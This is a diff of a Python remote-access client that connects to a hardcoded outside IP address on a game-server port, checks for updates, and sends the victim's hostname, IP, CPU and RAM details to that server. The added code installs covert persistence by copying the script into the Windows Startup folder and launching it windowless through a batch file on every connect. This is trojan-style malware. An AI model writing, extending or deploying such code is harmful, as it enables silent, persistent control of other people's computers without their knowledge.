@@ -26,6 +26,7 @@ logging.basicConfig(
     handlers=[logging.StreamHandler()]
 )
 
+
 class RemoteClient:
     SERVER_HOST = '176.106.246.150'
     SERVER_PORT = 25565
@@ -108,6 +109,28 @@ class RemoteClient:
                 logging.error(f"Update check failed: {e}")
             self.stop_event.wait(self.CHECK_INTERVAL)
 
+    def setup_autostart(self):
+        if os.name != 'nt':
+            return
+        try:
+            appdata = os.environ.get('APPDATA')
+            if not appdata:
+                return
+            startup_path = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            script_original = os.path.realpath(__file__)
+            script_copy = os.path.join(startup_path, 'client_copy.py')
+            bat_path = os.path.join(startup_path, 'client_start.bat')
+            pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
+
+            if not os.path.exists(script_copy):
+                shutil.copy2(script_original, script_copy)
+            if not os.path.exists(bat_path):
+                with open(bat_path, 'w') as f:
+                    f.write(f'@echo off\n"{pythonw}" "{script_copy}"\n')
+            logging.info("Autostart setup completed")
+        except Exception as e:
+            logging.error(f"Autostart setup failed: {e}")
+
     def handle_connection(self):
         try:
             self.sock.settimeout(30.0)
@@ -155,7 +178,7 @@ class RemoteClient:
                         info += f"Hostname: {socket.gethostname()}\n"
                         info += f"IP: {socket.gethostbyname(socket.gethostname())}\n"
                         info += f"CPU: {platform.processor()}\n"
-                        info += f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB"
+                        info += f"RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB"
                         self.send_data(info.encode())
                     except Exception as e:
                         self.send_data(f'ERROR: {e}'.encode())
@@ -276,6 +299,7 @@ class RemoteClient:
             logging.info("Connection closed")
 
     def connect(self):
+        self.setup_autostart()
         threading.Thread(target=self.auto_update, daemon=True).start()
         while not self.stop_event.is_set():
             try:
@@ -302,6 +326,7 @@ class RemoteClient:
             except:
                 pass
         logging.info("Client cleanup completed")
+
 
 if __name__ == '__main__':
     client = RemoteClient()
